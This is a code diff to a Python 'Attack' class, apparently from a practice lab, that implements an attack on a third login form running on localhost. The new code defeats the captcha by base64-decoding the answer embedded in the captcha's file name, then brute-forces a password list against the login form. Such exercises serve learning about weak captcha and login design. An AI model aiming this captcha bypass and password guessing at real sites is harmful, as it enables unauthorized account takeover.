@@ -1,7 +1,10 @@
 # imports
+import json
 import time
+import base64
 import requests
 import http.client
+import urllib.parse
 from termcolor import colored
 
 
@@ -132,9 +135,57 @@ class Attack():
   
 	# attack login form #3
 	def form_3(self):
-		pass
+		# get captcha end points
+		generate_url = 'http://127.0.0.1:5000/generate'		
+		solve_url = 'http://127.0.0.1:5000/captcha_submit'		
+		
+		index = 0
+		for p in self.passwords:
+			# generate captcha
+			captcha = (requests.get(generate_url)).content
 
+			# solve captcha
+			captcha_data = json.loads(captcha.decode('utf-8'))
+			value = captcha_data['captcha']		
+			value = value.split('captcha/')[1].split('.')[0]
 
+			# url and base64 decode captcha
+			answer = urllib.parse.unquote(value)
+			decoded = base64.b64decode(answer)
+			decoded = decoded.decode('utf-8')
+
+			# get expected captcha data
+			data = {
+				'captcha_input' : decoded,
+				'captcha_name'  : value
+			}
+
+			# submit captcha
+			submission = requests.post(solve_url, data=data)
+			if b'correct' in submission.content:
+				# display solved captcha
+				c = '[' + colored(f'Captcha {index}', 'magenta', attrs=['bold']) + ']'
+				print(f'{c} : "{decoded}" solved')
+       
+				# submit login attempt
+				data = {
+					'username': self.username,
+					'password': p,
+				}
+				login = requests.post(self.url, data=data)
+				
+    			# verify login status
+				if b'incorrect' in login.content:
+					c = '[' + colored(f'Failed  {index}', 'red', attrs=['bold']) + ']'
+					print(f'{c} : {self.username, p}')
+				else:
+					c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
+					print(f'\n{c} : {self.username, p}')
+					break
+ 
+				index += 1
+	
+     
 	# attack login form #4
 	def form_4(self):
 		pass
